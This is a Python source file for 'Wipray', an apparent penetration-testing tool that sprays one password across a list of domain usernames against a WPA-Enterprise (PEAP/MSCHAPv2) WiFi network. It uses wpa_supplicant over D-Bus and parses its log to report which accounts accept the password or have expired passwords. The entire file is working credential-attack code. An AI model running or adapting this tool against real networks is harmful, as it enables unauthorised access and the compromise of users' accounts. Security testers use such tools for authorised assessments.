#!/usr/bin/env python
#
# Email: labs@pwn.pt
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
import threading
import argparse
import time

parser = argparse.ArgumentParser(description='Wipray - Wifi password spray')
parser.add_argument('--user-file', help='User file containing a user in each line', required=True)
parser.add_argument('--password', help='The password to be used in the spray', required=True)
parser.add_argument('--domain', help='The users domain', required=True)
parser.add_argument('--ssid', help='The ssid to use', required=True)
parser.add_argument('--key-management', help='key_mgmt value', default="WPA-EAP")
parser.add_argument('--eap', help='eap value', default="PEAP")
parser.add_argument('--phase1', help='peapver=0', default="peapver=0")
parser.add_argument('--phase2', help='auth=MSCHAPV2', default="auth=MSCHAPV2")
parser.add_argument('--wpa_supplicant_log', help='Location of the log file containing the logs from wpa_supplicant',
                    default="/var/log/daemon.log")
parser.add_argument('--interface', help='Interface to use', default="wlan0")

# Parse arguments
args = parser.parse_args()

# Read all users from the users file
users_file = open(args.user_file)
user_list = []
for line in users_file:
    user_list.append(line.rstrip('\r\n'))

password = args.password
domain = args.domain
ssid = args.ssid
domain = args.domain
key_mgmt = args.key_management
eap = args.eap
phase1 = args.phase1
phase2 = args.phase2

# The interface we'll be using to perform the spray
interface_name = args.interface

# Where wpa_supplicant logs go to
wpa_supplicant_log = open(args.wpa_supplicant_log)


# Start a simple Twisted SelectReactor
reactor = SelectReactor()
threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
time.sleep(0.1)  # let reactor start

# Start Driver
driver = WpaSupplicantDriver(reactor)

# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
supplicant = driver.connect()

# Register an interface w/ the supplicant, this can raise an error if the supplicant
# already knows about this interface
interface = supplicant.create_interface(interface_name)

# Seek messages to the last line
wpa_supplicant_log.seek(0,2)

print "Starting password spraying on ssid " + ssid + "..."
for user in user_list:
    # WiFi Network configuration
    network_cfg = {}
    network_cfg['ssid'] = ssid
    network_cfg['key_mgmt'] = key_mgmt
    network_cfg['eap'] = eap
    network_cfg['identity'] = domain + "\\" + user
    network_cfg['password'] = password
    network_cfg['phase1'] = phase1
    network_cfg['phase2'] = phase2

    # Set the network configuration
    network = interface.add_network(network_cfg)
    #print "[*] Trying " + network_cfg['identity'] + ":" + network_cfg['password']
    # Try to connect and authenticate
    interface.select_network(network.get_path())
    # Loop until we confirm if we were able to login
    authenticated = True
    failed_login = False
    expired_password = False
    reason = ""
    last_state = "disconnected"
    while interface.get_state() != "completed" and not failed_login and not expired_password:
        # Keep updating the state where we're at
        if interface.get_state() != last_state:
            last_state = interface.get_state()
        # Read wpa_supplicant logs to check if we've failed login
        line = wpa_supplicant_log.readline()
        while line:
            if "EAP-TLV: TLV Result - Failure" in line:
                authenticated = False
                expired_password = False
                failed_login = True
            elif "EAP-MSCHAPV2: failure message" in line:
                authenticated = False
                expired_password = True
                failed_login = False
                line = wpa_supplicant_log.readline()
                line_split = line.split(interface_name)
                reason = line_split[1]
                reason = reason.rstrip('\r\n')
                reason = reason[2:]
            line = wpa_supplicant_log.readline()
            time.sleep(0.1)
        time.sleep(0.1)
    if authenticated:
        print "\033[92m[+]\033[0m Success " + network_cfg['identity'] + ":" + network_cfg['password']
        interface.remove_network(network.get_path())
    elif expired_password:
        print "\033[93m[+]\033[0m Success " + network_cfg['identity'] + ":" + network_cfg['password'] + " (" \
              + reason + ")"
    else:
        print "\033[91m[-]\033[0m Failed " + network_cfg['identity'] + ":" + network_cfg['password']

# Disconnecting
print "Finished"
exit()
